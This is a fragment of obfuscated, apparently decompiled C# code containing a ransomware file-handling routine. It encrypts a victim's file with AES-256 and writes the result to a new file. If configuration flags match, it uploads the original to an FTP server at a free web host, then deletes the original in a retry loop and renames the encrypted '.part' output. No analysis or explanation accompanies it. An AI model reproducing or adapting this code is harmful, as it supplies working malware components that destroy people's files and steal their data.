			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (aoKucOAXWplH == "YES")
					{
						foreach (string item in EOnHZiqFYPIusB)
						{
							if (string_0.EndsWith(item) && tSEWIBzroXuH == "YES" && Convert.ToInt32(XKtUrmYTjQTx) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									ExWKLhwomGZ.fjRHSuDjwIHH("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", string_0);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
